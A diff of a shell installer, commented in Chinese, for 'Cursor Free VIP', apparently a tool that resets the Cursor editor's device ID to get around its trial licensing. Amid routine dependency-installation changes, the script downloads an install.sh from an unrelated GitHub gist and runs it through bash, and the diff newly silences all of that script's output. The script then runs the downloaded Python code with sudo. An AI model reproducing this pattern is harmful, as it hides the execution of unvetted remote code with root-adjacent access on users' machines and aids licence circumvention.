@@ -25,7 +25,7 @@ EOF
 # 检测操作系统类型
 OS_TYPE=$(uname -s)
 
-# 检查包管理器和安装必需的包
+# 检查包管理器和安装必需的系统包
 install_dependencies() {
     case $OS_TYPE in
         "Darwin") 
@@ -49,7 +49,7 @@ install_dependencies() {
                 PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
             fi
             
-            # --- 新增：确保安装 unzip 用于解压源码 ---
+            # 确保安装 unzip 用于解压源码
             if ! command -v unzip &> /dev/null; then
                 PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL unzip"
             fi
@@ -67,39 +67,59 @@ install_dependencies() {
     esac
 }
 
-# 安装依赖
+# --- 关键修复区域：Python 依赖安装 ---
+# 执行系统级依赖安装
 install_dependencies
+
+# 设置 pip 安装命令
 if [ "$OS_TYPE" = "Linux" ]; then
     PIP_INSTALL="pip3 install --break-system-packages"
 else
     PIP_INSTALL="pip3 install"
 fi
 
+echo -e "${CYAN}ℹ️ 正在检查并补全 Python 依赖库...${NC}"
+
+# 1. Requests
 if ! pip3 show requests >/dev/null 2>&1; then
+    echo -e "${YELLOW}正在安装 requests...${NC}"
     $PIP_INSTALL requests
 fi
 
+# 2. Cryptography
 if ! pip3 show cryptography >/dev/null 2>&1; then
+    echo -e "${YELLOW}正在安装 cryptography...${NC}"
     $PIP_INSTALL cryptography
 fi
 
-# 确保 colorama 也被安装（源码版通常需要）
+# 3. Colorama (源码版常需)
 if ! pip3 show colorama >/dev/null 2>&1; then
+    echo -e "${YELLOW}正在安装 colorama...${NC}"
     $PIP_INSTALL colorama
 fi
 
+# 4. Python-Dotenv (修复你遇到的报错)
+if ! pip3 show python-dotenv >/dev/null 2>&1; then
+    echo -e "${YELLOW}正在安装 python-dotenv...${NC}"
+    $PIP_INSTALL python-dotenv
+fi
+
+# 5. Typer (源码版常见依赖，预防性安装)
+if ! pip3 show typer >/dev/null 2>&1; then
+     echo -e "${YELLOW}正在安装 typer...${NC}"
+    $PIP_INSTALL typer
+fi
+
+# Gist 安装脚本 (如果需要保留)
 GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
 if command -v curl &>/dev/null; then
-    bash <(curl -fsSL "$GIST_URL")
+    bash <(curl -fsSL "$GIST_URL") >/dev/null 2>&1
 elif command -v wget &>/dev/null; then
-    bash <(wget -qO- "$GIST_URL")
-else
-    exit 1
+    bash <(wget -qO- "$GIST_URL") >/dev/null 2>&1
 fi
 
 # 获取下载文件夹路径
 get_downloads_dir() {
-    # 源码版我们将解压到用户目录下的隐藏文件夹，保持整洁
     echo "$HOME/.cursor-vip-src"
 }
 
@@ -122,23 +142,31 @@ setup_autostart() {
 install_cursor_free_vip() {
     local install_dir=$(get_downloads_dir)
     local zip_name="cursor-free-vip-${VERSION}.zip"
-    local zip_path="/tmp/${zip_name}" # 下载到临时目录
-    local extract_dir="${install_dir}/cursor-free-vip-${VERSION}"
+    local zip_path="/tmp/${zip_name}"
     
-    # 使用官方源码包地址 (Source code zip)
+    # 动态获取解压后的目录名 (有时 GitHub 会带 v 有时不会，取决于 tag 打法)
+    # 我们先定义期望的解压路径，稍后用 find 修正
+    
+    # 使用官方源码包地址
     local download_url="https://github.com/SHANMUGAM070106/cursor-free-vip/archive/refs/tags/v${VERSION}.zip"
     
-    # 创建安装目录
     mkdir -p "$install_dir"
 
-    # 如果已经解压过，直接运行
-    if [ -f "${extract_dir}/main.py" ]; then
+    # 检查是否已存在（简单的非空检查，或者检查 main.py）
+    # 为了保险，每次都重新查找目录
+    local existing_dir=$(find "${install_dir}" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)
+    
+    if [ -n "$existing_dir" ] && [ -f "${existing_dir}/main.py" ]; then
         echo -e "${GREEN}✅ 检测到已安装的源码版本${NC}"
-        run_python_script "${extract_dir}/main.py"
+        # 再次确保依赖安装，防止上次中断
+        if [ -f "${existing_dir}/requirements.txt" ]; then
+             $PIP_INSTALL -r "${existing_dir}/requirements.txt" >/dev/null 2>&1
+        fi
+        run_python_script "${existing_dir}/main.py"
         return
     fi
 
-    echo -e "${CYAN}ℹ️ 原版二进制文件缺失，切换为源码下载模式...${NC}"
+    echo -e "${CYAN}ℹ️ 正在下载源码包...${NC}"
     echo -e "${CYAN}ℹ️ 下载链接: ${download_url}${NC}"
     
     if ! curl -L -o "${zip_path}" "$download_url"; then
@@ -149,15 +177,16 @@ install_cursor_free_vip() {
     echo -e "${CYAN}ℹ️ 正在解压源码...${NC}"
     if unzip -o "${zip_path}" -d "${install_dir}" >/dev/null; then
         echo -e "${GREEN}✅ 解压完成!${NC}"
-        # 移除 tag 中的 'v' 前缀以匹配解压后的文件夹名 (GitHub zip 命名规则通常不带 v 如果 tag 带 v, 这里需适配)
-        # GitHub archive rule: repo-tag (without v if tag is v1.2, folder is repo-1.2 usually)
-        # 让我们动态查找解压后的文件夹
+        
+        # 查找解压后的实际目录名称
         local actual_dir=$(find "${install_dir}" -maxdepth 1 -type d -name "cursor-free-vip*" | head -n 1)
         
         if [ -n "$actual_dir" ]; then
-             echo -e "${CYAN}ℹ️ 安装依赖 (requirements.txt)...${NC}"
+             echo -e "${CYAN}ℹ️ 安装项目特定依赖 (requirements.txt)...${NC}"
              if [ -f "${actual_dir}/requirements.txt" ]; then
-                $PIP_INSTALL -r "${actual_dir}/requirements.txt" >/dev/null 2>&1
+                $PIP_INSTALL -r "${actual_dir}/requirements.txt"
+             else
+                echo -e "${YELLOW}⚠️ 未找到 requirements.txt，假设通用依赖已安装${NC}"
              fi
              
              run_python_script "${actual_dir}/main.py"
@@ -177,9 +206,9 @@ run_python_script() {
     echo -e "${CYAN}ℹ️ 正在启动 Cursor Free VIP (源码模式)...${NC}"
     echo -e "${YELLOW}⚠️ 提示: 需要输入密码以修改系统设备ID${NC}"
     
-    # 赋予执行权限（虽然 py 不需要，但为了保险）
     chmod +x "$script_path"
     
+    # 尝试使用 sudo 运行 python3
     if [ "$EUID" -ne 0 ]; then
         sudo python3 "$script_path"
     else
